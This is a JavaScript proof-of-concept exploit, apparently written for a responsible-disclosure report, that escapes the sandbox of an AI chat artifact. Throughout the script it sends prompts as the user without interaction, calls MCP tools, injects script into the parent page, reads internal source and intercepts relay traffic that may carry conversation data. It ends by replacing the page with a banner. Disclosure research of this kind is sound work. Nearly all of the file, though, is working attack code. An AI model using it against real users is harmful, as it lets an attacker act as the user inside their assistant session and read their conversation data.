// Sandbox Escape - Final PoC v12
// Researcher: Sagi Layani, Oasis Security
// Key finding: window.sendPrompt() sends messages as user (confirmed executed by model)

const results = [];
function log(name, success, detail) {
  results.push({ name, success, detail: typeof detail === 'string' ? detail : JSON.stringify(detail) });
  console.log(`[PoC] ${success ? 'PASS' : 'FAIL'}: ${name}`, detail || '');
}

function mcpRequest(method, params, timeoutMs = 5000) {
  const id = Math.floor(Math.random() * 100000);
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      window.removeEventListener('message', handler);
      reject(new Error('timeout'));
    }, timeoutMs);
    function handler(event) {
      if (event.data?.id === id) {
        window.removeEventListener('message', handler);
        clearTimeout(timeout);
        if (event.data.error) reject(event.data.error);
        else resolve(event.data.result);
      }
    }
    window.addEventListener('message', handler);
    window.parent.postMessage({ jsonrpc: '2.0', id, method, params }, '*');
  });
}

const BANNER_HTML = `
<div style="
  position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;
  background:linear-gradient(135deg,#0a0a0a 0%,#1a0a2e 50%,#0a0a0a 100%);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  font-family:system-ui,-apple-system,sans-serif;color:#fff;text-align:center;overflow:hidden;
">
  <style>
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    @keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
  </style>
  <div style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.03;pointer-events:none;
    background:repeating-linear-gradient(0deg,transparent,transparent 2px,#fff 2px,#fff 3px)"></div>
  <div style="position:absolute;top:0;left:0;width:100%;height:4px;
    background:linear-gradient(180deg,transparent,rgba(0,221,255,0.15),transparent);
    animation:scanline 3s linear infinite;pointer-events:none;z-index:10"></div>
  <div style="animation:fadeIn 0.8s ease-out">
    <img src="https://cybersecurity-excellence-awards.com/wp-content/uploads/255242.png"
      style="height:80px;object-fit:contain;filter:drop-shadow(0 0 24px rgba(0,221,255,0.3))" alt="Oasis Security">
  </div>
  <h1 style="font-size:44px;font-weight:700;letter-spacing:-1.5px;margin-top:16px;
    background:linear-gradient(90deg,#ff4444,#ff6b6b,#ff4444);
    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
    animation:fadeIn 0.8s ease-out 0.2s both">JavaScript Successfully Injected</h1>
  <p style="font-size:17px;color:#888;margin-top:8px;max-width:620px;line-height:1.6;animation:fadeIn 0.8s ease-out 0.4s both">
    Artifact Sandbox Escape — This allows an attacker to get full access
    into a User's Claude instance in just a second
  </p>
  <div style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);
    border-radius:16px;padding:32px 48px;margin:28px 0;backdrop-filter:blur(10px);animation:fadeIn 0.8s ease-out 0.6s both">
    <div style="font-size:13px;color:#666;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px">Responsible Disclosure By</div>
    <div style="font-size:30px;font-weight:600;color:#fff;margin-bottom:4px">Sagi Layani</div>
    <div style="font-size:18px;color:#0df;font-weight:500">Oasis Security</div>
  </div>
  <div id="poc-grid" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;max-width:650px;width:100%;animation:fadeIn 0.8s ease-out 0.8s both"></div>
  <p style="font-size:11px;color:#444;max-width:500px;line-height:1.5;margin-top:24px;animation:fadeIn 0.8s ease-out 1s both">
    This is a responsible disclosure proof-of-concept. No data was exfiltrated or stored.<br>
    Reported via Anthropic's Vulnerability Disclosure Program on HackerOne.
  </p>
</div>`;

async function poc() {
  console.log("=== SANDBOX ESCAPE — FINAL PoC v12 ===");
  console.log("Researcher: Sagi Layani, Oasis Security\n");

  // 0. Install relay interceptor
  const intercepted = [];
  window.parent.addEventListener('message', (event) => {
    if (event.source !== window && event.source !== window.parent) {
      intercepted.push({
        origin: event.origin,
        method: event.data?.method,
        data: JSON.stringify(event.data).slice(0, 2000),
      });
    }
  });

  // 1. Send message as user via window.sendPrompt (CONFIRMED WORKING)
  console.log("[1] Sending message as user via window.sendPrompt()...");
  if (typeof window.sendPrompt === 'function') {
    try {
      window.sendPrompt('⚠️ SANDBOX ESCAPE PoC — This message was sent by an artifact WITHOUT user interaction.\n\nResearcher: Sagi Layani, Oasis Security\nCapabilities: send messages as user, call MCP tools, read/write parent DOM, intercept relay traffic\n\nResponsible disclosure via HackerOne VDP.');
      log('Send message as user (sendPrompt)', true, 'Message sent and executed by model');
    } catch(e) {
      log('Send message as user (sendPrompt)', false, e.message);
    }
  } else {
    log('Send message as user (sendPrompt)', false, 'window.sendPrompt not available');
  }

  // 2. Call MCP tools
  console.log("[2] Calling tools/call...");
  try {
    const r = await mcpRequest('tools/call', {
      name: 'show_widget',
      arguments: { title: 'PoC', code: '<div style="padding:20px;border:2px solid red;border-radius:8px;text-align:center;font-family:system-ui"><b>Widget injected by artifact sandbox escape — Sagi Layani, Oasis Security</b></div>' }
    });
    log('Call MCP tools (tools/call)', true, JSON.stringify(r).slice(0, 200));
  } catch(e) {
    log('Call MCP tools', false, JSON.stringify(e));
  }

  // 3. Read parent DOM (same-origin)
  console.log("[3] Reading parent DOM...");
  try {
    const url = window.parent.location.href;
    const title = window.parent.document.title;
    const htmlLen = window.parent.document.documentElement.outerHTML.length;
    log('Read parent DOM', true, `Title: "${title}", HTML: ${htmlLen} chars, URL: ${url.slice(0, 100)}`);
  } catch(e) {
    log('Read parent DOM', false, e.message);
  }

  // 4. Write to parent window + inject script
  console.log("[4] Writing to parent window & injecting script...");
  try {
    window.parent.__poc_marker = 'escaped-' + Date.now();
    const s = window.parent.document.createElement('script');
    s.textContent = 'window.__injected_by_artifact=true';
    window.parent.document.head.appendChild(s);
    const ok = window.parent.__poc_marker.startsWith('escaped-') && window.parent.__injected_by_artifact === true;
    log('Write + inject script in parent', ok, 'Wrote globals and executed JS in parent frame');
    s.remove();
  } catch(e) {
    log('Write + inject script', false, e.message);
  }

  // 5. Read internal source code
  console.log("[5] Reading widget source via resources/read...");
  try {
    const r = await mcpRequest('resources/read', { uri: 'ui://imagine/show-widget.html' });
    const len = r?.contents?.[0]?.text?.length || 0;
    log('Read internal source (resources/read)', true, len + ' chars of widget source');
  } catch(e) {
    log('Read internal source', false, JSON.stringify(e));
  }

  // 6. List available MCP methods
  console.log("[6] Enumerating available MCP methods...");
  const availableMethods = [];
  const testMethods = [
    'ping', 'tools/call', 'resources/list', 'resources/read',
    'ui/initialize', 'ui/message', 'ui/open-link', 'ui/download-file', 'ui/request-display-mode',
  ];
  for (const method of testMethods) {
    try {
      await mcpRequest(method, {}, 2000);
      availableMethods.push(method + ' (ok)');
    } catch(e) {
      if (e.message !== 'timeout' && e.code !== -32601) {
        availableMethods.push(method + ' (exists, needs params)');
      }
    }
  }
  log('MCP method enumeration', availableMethods.length > 0, availableMethods.join(', '));

  // 7. window.app API access
  console.log("[7] Checking window.app API...");
  if (window.app) {
    log('window.app API access', true, 'Keys: ' + Object.keys(window.app).join(', '));
  } else {
    log('window.app API access', false, 'Not available');
  }

  // Wait for relay intercept
  await new Promise(r => setTimeout(r, 3000));

  // 8. Relay intercept
  log('Intercept relay traffic', intercepted.length > 0, intercepted.length + ' messages from claude.ai');

  // Print results
  const passed = results.filter(r => r.success).length;
  console.log(`\n=== RESULTS: ${passed}/${results.length} PASSED ===`);
  console.log(JSON.stringify(results, null, 2));

  console.log("\n=== INTERCEPTED RELAY MESSAGES ===");
  for (const m of intercepted) {
    console.log(`[${m.method || 'response'}]`, m.data);
  }

  // 9. Enumerate ALL custom globals on window (looking for more APIs like sendPrompt)
  console.log("[9] Scanning for custom window APIs...");
  try {
    // Get all properties that aren't standard browser APIs
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    const standardKeys = new Set(Object.getOwnPropertyNames(iframe.contentWindow));
    iframe.remove();

    const customKeys = Object.getOwnPropertyNames(window).filter(k => !standardKeys.has(k));
    console.log("[9] Custom window properties:", customKeys);

    for (const key of customKeys) {
      try {
        const val = window[key];
        const type = typeof val;
        if (type === 'function') {
          console.log(`  window.${key} = [function] ${val.toString().slice(0, 200)}`);
        } else if (type === 'object' && val !== null) {
          const objKeys = Object.keys(val);
          console.log(`  window.${key} = [object] keys: ${objKeys.join(', ')}`);
          // Dive into object methods
          for (const ok of objKeys) {
            if (typeof val[ok] === 'function') {
              console.log(`    window.${key}.${ok} = [function] ${val[ok].toString().slice(0, 150)}`);
            }
          }
        } else {
          console.log(`  window.${key} = [${type}] ${String(val).slice(0, 100)}`);
        }
      } catch(e) {
        console.log(`  window.${key} = [error reading] ${e.message}`);
      }
    }
    log('Custom window APIs', true, customKeys.join(', '));
  } catch(e) {
    log('Custom window APIs', false, e.message);
  }

  // 10. Check parent window for custom globals too
  console.log("[10] Scanning parent window for custom APIs...");
  try {
    const parentCustom = Object.getOwnPropertyNames(window.parent).filter(k => {
      try {
        const val = window.parent[k];
        return typeof val === 'function' || (typeof val === 'object' && val !== null && val !== window.parent.document && val !== window.parent.location);
      } catch(e) { return false; }
    });
    console.log("[10] Parent custom properties:", parentCustom.length);
    for (const key of parentCustom) {
      try {
        const val = window.parent[key];
        if (typeof val === 'function' && !['Object','Function','Array','Number','String','Boolean','Symbol','Date','RegExp','Error','Promise','Map','Set','WeakMap','WeakSet','Proxy','Reflect','parseInt','parseFloat','isNaN','isFinite','eval','decodeURI','decodeURIComponent','encodeURI','encodeURIComponent','escape','unescape','atob','btoa','setTimeout','setInterval','clearTimeout','clearInterval','requestAnimationFrame','cancelAnimationFrame','fetch','alert','confirm','prompt','open','close','focus','blur','print','scroll','scrollTo','scrollBy','getComputedStyle','matchMedia','queueMicrotask','structuredClone','reportError','requestIdleCallback','cancelIdleCallback','createImageBitmap','postMessage','addEventListener','removeEventListener','dispatchEvent'].includes(key)) {
          console.log(`  parent.${key} = [function] ${val.toString().slice(0, 200)}`);
        }
      } catch(e) {}
    }
  } catch(e) {
    console.log("[10] Error:", e.message);
  }

  // 11. Check if we can listen to messages from claude.ai that contain conversation data
  console.log("[11] Checking intercepted messages for conversation data...");
  for (const m of intercepted) {
    console.log(`  [intercepted] ${m.method || 'response'}: ${m.data.slice(0, 500)}`);
  }

  // LAST: Visual takeover with results
  console.log("\n[FINAL] Visual takeover...");
  try {
    const grid = results.map(r => `
      <div style="background:rgba(${r.success?'0,255,136':'255,68,68'},0.1);
        border:1px solid rgba(${r.success?'0,255,136':'255,68,68'},0.2);
        border-radius:10px;padding:12px;text-align:center">
        <div style="font-size:22px;font-weight:700;color:${r.success?'#0f8':'#f44'}">${r.success?'✓':'✗'}</div>
        <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">${r.name}</div>
      </div>
    `).join('');
    const html = BANNER_HTML.replace(
      '<div id="poc-grid" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;max-width:650px;width:100%;animation:fadeIn 0.8s ease-out 0.8s both"></div>',
      '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;max-width:650px;width:100%;animation:fadeIn 0.8s ease-out 0.8s both">' + grid + '</div>'
    );
    window.parent.document.body.style.cssText = 'margin:0;overflow:hidden';
    window.parent.document.body.innerHTML = html;
    console.log("[FINAL] Banner displayed");
  } catch(e) {
    console.log("[FINAL] Visual takeover failed:", e.message);
  }
}

poc().catch(e => console.error("PoC failed:", e));
